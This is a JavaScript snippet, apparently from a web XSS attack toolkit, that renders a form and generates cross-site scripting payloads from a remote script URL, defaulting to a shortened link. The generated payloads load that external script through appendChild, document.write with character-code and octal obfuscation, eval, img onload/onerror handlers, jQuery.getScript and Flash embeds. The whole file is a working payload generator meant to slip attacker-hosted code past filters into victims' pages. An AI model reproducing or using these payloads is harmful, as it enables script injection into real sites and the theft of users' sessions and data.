_$('contentbox').style.display ='block';
_$('contentbox').innerHTML = ' <select style="width:120px" id="type" name="type">\
<option value="apc">appendChild调用</option>\
<option value="docu">document.write调用</option>\  <option value="eval">eval调用</option>\
<option value="img">img标签调用</option><option value="jquery">Jquery调用</option><option value="script">script标签调用</option><option value="embed">Flash调用</option></select><button id="goxss">CREATE</button><br />\
<input type="text" id="scrurl" name="scrurl" value="http://t.cn/RZPq7wA" style="width:98%;">\
<textarea id="xsstext" style="margin: 2px; width: 98%; height: 88px;"></textarea>';
_$('goxss').onclick = function(){
scr_url = _$("scrurl").value;
type = _$("type").value;
var Stringde = new Array();		//创建一个新的数组  接受加密后的内容
for(var i=0;i<scr_url.length;i++) 
{
	Stringde[i]=scr_url.charCodeAt(i)  //数组中的 第当前循环值的下标的值 等于 要加密的当前下标的值  加密
}
uni_url = scr_url.replace(/\\/g, "\\\\").replace(/\//g, "\\/").replace(/\'/g,"\\\'").replace(/\"/g,"\\\"");

var string = "String.fromCharCode("+Stringde+")";
var values= '';
switch(type){
case "apc":
	values = "var s=document.createElement(String.fromCharCode(115,99,114,105,112,116));s.src="+string+";document.body.appendChild(s)";
	break;
case "docu":
	values = "document.write('<script src=\\'"+uni_url+"\\'><\\/script>');\r\n\r\n";
	values += "document.write(String.fromCharCode(60,115,99,114,105,112,116,32,115,114,99,61,39,"+Stringde+",39,62,60,92,47,115,99,114,105,112,116,62));\r\n\r\n";
	var res = "";
		for(var i=0;i<scr_url.length;i++)
				{
					res +="\\"+scr_url.charCodeAt(i).toString(8);
				}
	values += "document.write(unescape('\\74\\163\\143\\162\\151\\160\\164\\40\\163\\162\\143\\75"+res+"\\76\\74\\57\\163\\143\\162\\151\\160\\164\\76'));"
	break;
case "eval":
	values = "eval('window.s=document.createElement(String.fromCharCode(115,99,114,105,112,116));window.s.src="+string+";document.body.appendChild(window.s)')";
	break;
case "img":
	values = "<img/src=http://www.baidu.com/img/baidu_sylogo1.gif onload=(function(){window.s=document.createElement(String.fromCharCode(115,99,114,105,112,116));window.s.src="+string+";document.body.appendChild(window.s)})()>\r\n\r\n";
	values += "<img/src=1 onerror=(function(){window.s=document.createElement(String.fromCharCode(115,99,114,105,112,116));window.s.src="+string+";document.body.appendChild(window.s)})()>";
	break;
case "jquery":
	values = "jQuery.getScript("+string+")";
	break;
case "script":
	values = "<script/src="+scr_url+"></script>";
	break;
case "embed":
	values = "<embed src="+scr_url+" allowscriptaccess=always type=application/x-shockwave-flash></embed>";
	break;
}
_$("xsstext").value = values;
}